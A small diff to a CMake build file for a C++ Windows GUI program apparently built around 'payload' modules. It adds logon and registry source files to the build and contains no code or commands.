@@ -1,5 +1,4 @@
 cmake_minimum_required(VERSION 3.20)
-
 project(hgvcuj LANGUAGES CXX)
 
 set(CMAKE_CXX_STANDARD 20)
@@ -26,6 +25,8 @@ set(SOURCES
     src/bytebeat.cpp
     src/payloads/gdirender/gdieffects.cpp
     src/stages.cpp
+    src/payloads/logon.cpp
+    src/payloads/registry.cpp
 )
 
 add_executable(${PROJECT_NAME} WIN32 ${SOURCES})
